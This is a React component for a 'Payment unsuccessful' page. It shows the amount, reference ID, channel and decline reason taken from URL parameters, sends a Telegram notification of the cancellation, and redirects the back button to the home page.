import { useEffect } from "react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { sendTelegramNotification } from "@/lib/payment-telegram";

const PaymentCancelled = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const channel = searchParams.get("channel") || "GenZ Payment Service";
  const reason = searchParams.get("reason") || "Method not Selected";
  const amount = searchParams.get("amount") || "0";
  const refId = searchParams.get("ref") || "—";

  useEffect(() => {
    void sendTelegramNotification({ type: "payment_cancelled", amount });
  }, [amount]);

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate("/", { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  return (
    <div className="h-screen bg-white flex flex-col items-center pt-16 px-4 overflow-hidden">
      <div className="w-full max-w-lg text-center">
        <h2 className="text-xl font-bold text-gray-900 mb-3">Payment unsuccessful</h2>
        <p className="text-gray-600 text-sm mb-1">
          Your payment of <span className="font-bold text-gray-900">{amount}</span> BDT is{" "}
          <span className="text-red-500 font-semibold">FAILED (Merchant Verification Failed)</span>.
        </p>
        <p className="text-gray-700 text-sm mb-8">payment ref id <span className="font-medium">{refId}</span></p>
        <div className="border-t border-gray-200 mb-8" />
        <div className="space-y-3">
          <p className="text-gray-500 text-sm">Payment Channel - <span className="font-bold text-gray-800">{channel}</span></p>
          <p className="text-gray-500 text-sm">Reason for Declined - <span className="font-bold text-gray-800">{reason}</span></p>
        </div>
      </div>
    </div>
  );
};

export default PaymentCancelled;
